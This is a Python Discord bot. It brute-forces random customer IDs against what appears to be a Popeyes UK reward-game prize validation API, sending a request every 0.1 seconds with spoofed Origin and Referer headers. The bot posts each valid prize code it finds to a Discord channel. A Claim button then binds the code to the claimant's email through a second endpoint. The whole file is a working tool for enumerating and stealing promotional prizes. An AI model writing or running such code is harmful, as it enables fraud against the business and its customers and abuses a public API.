import discord
from discord.ext import commands, tasks
from discord import ui
import requests
import json
import random
import datetime

TOKEN = ''
GUILD_ID = 1385033732594991175  # replace with your actual guild/server ID
CHANNEL_ID = 1385275395397648395  # where messages should be sent
API_URL = "https://pe-uk-ordering-api-fd-eecsdkg6btfeg0cc.z01.azurefd.net/api/v2/rewardgame/prize/validate"

headers = {
    'User-Agent': 'Mozilla/5.0',
    'Origin': 'https://popeyesuk.com/',
    'Referer': 'https://popeyesuk.com/',
    'Content-Type': 'application/json'
}

used_ids = set()
count = 0
expired = 0

total_attempts = 0  # Total across entire session
current_code_attempts = 0  # Resets per code

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

def generate_unique_id():
    while True:
        new_id = str(random.randint(100000000, 999999999))
        if new_id not in used_ids:
            used_ids.add(new_id)
            return new_id

class ClaimButton(ui.View):
    def __init__(self, customer_id, tries):
        super().__init__()
        self.customer_id = customer_id
        self.tries = tries
        self.claimed = False

    @ui.button(label="Claim", style=discord.ButtonStyle.success)
    async def claim(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.claimed:
            await interaction.response.send_message("Already claimed.", ephemeral=True)
            return

        modal = EmailModal(self.customer_id, self.tries, interaction.message)
        await interaction.response.send_modal(modal)
        self.claimed = True

class EmailModal(ui.Modal, title="Enter Your Email"):
    email = ui.TextInput(label="Your email", style=discord.TextStyle.short, required=True)

    def __init__(self, customer_id, tries, original_msg):
        super().__init__()
        self.customer_id = customer_id
        self.tries = tries
        self.original_msg = original_msg

    async def on_submit(self, interaction: discord.Interaction):
        # Run the curl-equivalent request
        match_url = "https://pe-uk-ordering-api-fd-eecsdkg6btfeg0cc.z01.azurefd.net/api/v2/rewardgame/order/matchWithEmail"
        payload = {
            "email": self.email.value,
            "customerUniqueId": self.customer_id
        }

        try:
            response = requests.post(match_url, headers=headers, json=payload)
            success = response.status_code == 200
        except Exception as e:
            success = False

        # Update original message
        timestamp = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
        claimed_by = interaction.user.mention
        new_content = f"✅ **Code has been claimed**\nA new code was found: `{self.customer_id}`\nTook `{self.tries}` tries\n**Claimed by:** {claimed_by} at `{timestamp}`"
        await self.original_msg.edit(content=new_content, view=None)
        await interaction.response.send_message("Code claimed successfully!", ephemeral=True)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    find_codes.start()

@tasks.loop(seconds=0.1)
async def find_codes():
    global total_attempts, current_code_attempts, expired
    total_attempts += 1
    current_code_attempts += 1

    customer_id = generate_unique_id()
    payload = json.dumps({
        "customerUniqueId": customer_id,
        "orderId": None
    })

    try:
        response = requests.post(API_URL, headers=headers, data=payload)
        data = response.json()

        if data.get("hasErrors") is False:
            print("Valid code found!")

            channel = bot.get_channel(CHANNEL_ID)
            msg = await channel.send(
                content=(
                    f"A new code has been found: `{customer_id}`\n"
                    f"It took us `{current_code_attempts}` tries to find this one...\n"
                    f"Total attempts so far: `{total_attempts}`\n"
                    f"**Claimed by: _nobody yet_**"
                ),
                view=ClaimButton(customer_id, current_code_attempts)
            )

            current_code_attempts = 0  # Reset per code

        elif "Expired" in response.text:
            expired += 1

    except Exception as e:
        print(f"Error with ID {customer_id}: {e}")


bot.run(TOKEN)
